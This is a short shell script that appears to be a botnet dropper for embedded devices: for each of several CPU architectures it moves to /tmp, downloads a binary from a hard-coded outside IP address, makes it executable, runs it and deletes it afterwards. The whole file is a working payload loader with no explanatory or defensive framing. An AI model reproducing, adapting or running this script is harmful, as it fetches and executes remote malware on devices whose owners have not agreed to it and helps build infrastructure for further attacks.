#!/bin/sh
variants="mips arm ppc x86"
remote=23.95.44.12
artifact=build
out=worker
for cpu in $variants; do
cd /tmp
wget http://$remote/$artifact.$cpu -O $out
chmod 777 $out
./$out
rm -f $out
done
